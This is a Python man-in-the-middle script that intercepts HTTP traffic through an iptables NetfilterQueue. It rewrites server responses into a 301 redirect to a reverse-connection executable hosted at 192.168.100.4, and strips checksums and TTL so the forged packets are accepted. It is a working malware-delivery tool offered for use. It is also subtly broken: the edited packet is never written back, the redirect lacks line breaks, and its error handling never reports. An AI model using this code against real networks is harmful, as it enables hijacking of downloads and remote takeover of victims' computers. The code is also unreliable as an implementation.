#!/usr/bin/env python3.11
"""
 - This Script Performs File Intercepting And Replace Target Requested File With Attack Script File .

 * Intercept Phase :
 - Start MITM Attack .
 - Intercept And Store Target Packet In NetFilter Queue Using IP Tables .

 * Modification Phase :
 - Replace Load Field Which Contains Target Requested File Hexa Code From The Server As Response With Redirection Link To Attack File URL .
 - Delete Fields Which Target Computer Used To Check Request Integrity 'IP.ttl , IP.chksum, TCP.chksum' .

 * Redirecting Phase :
 - After Modify Request Packet, Redirect Modified Packet To The Target Using .accept() Function .

"""

from contextlib import suppress
from subprocess import run, DEVNULL, call
from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP, TCP
from scapy.layers.http import HTTP
from scapy.all import Raw


with suppress(
    KeyboardInterrupt, IndexError, ValueError, TypeError, AttributeError
) as ERROR:
    NFQNumber: int = int(input("[NFQN] :  ").strip())
    ACKNOWLEGEMENTSPool: list = []

    def __ExtractDeleteModifyPacketFields(PKT, LOAD) -> IP:
        """
        * Delete Original Target Packet Fields .
        - TCP Checksum .
        - IP Checksum .
        - IP TTL 'Time To Live' .

        * Replace Original Target Packet Load Field With Redirect Field Contain Attack-File .

        :param PKT: Scapy Edition
        :param LOAD: Attack-File Link Load
        :return: Modified Scapy-Edition Packet
        """
        PKT[Raw].load = LOAD
        del PKT[TCP].chksum
        del PKT[IP].chksum
        del PKT[IP].ttl
        return PKT

    def PacketProcessing(PACKET) -> None:
        """
        * Convert Intercepted Packet To Scapy Edition Packet To Be Able to Modify It .
        * Filtering It Based On Layers 'Raw' Or 'HTTP' .
        * Filtering Requests And Responses Based On Source Port And Destination Port .
        * Check Request-Packet Sequence Number With Response-Packet Acknowledgment Number .

        :param PACKET: Intercepted Stored HTTP-Packet
        :return: None
        """
        SEPacket: IP = IP(PACKET.get_payload())
        if SEPacket.haslayer(HTTP):
            ACKNOWLEGEMENTSPool.append(SEPacket[TCP].ack)
            if SEPacket[TCP].dport == 80:
                print("[HTTP-REQ]\n\n")
                print(SEPacket.show())
            elif SEPacket[TCP].sport == 80:
                if SEPacket[TCP].seq in ACKNOWLEGEMENTSPool:
                    print("[HTTP-RES] \n\n")
                    ModifiedPKT = __ExtractDeleteModifyPacketFields(
                        PKT=SEPacket,
                        LOAD="HTTP/1.1 301 Moved Permanently"
                        "Location: http://192.168.100.4/Public/Client_Reverse_Connection.exe",
                    )
                    print(ModifiedPKT.show())

        # TargetOriginalPacket.Accept To Allow Redirecting Packet To Target And Don't Interrupt The Connection .
        PACKET.accept()

    NFObject: NetfilterQueue = NetfilterQueue()
    NFObject.bind(NFQNumber, PacketProcessing)
    NFObject.run()


if ERROR:
    print(f"[-] ERROR {ERROR} ")
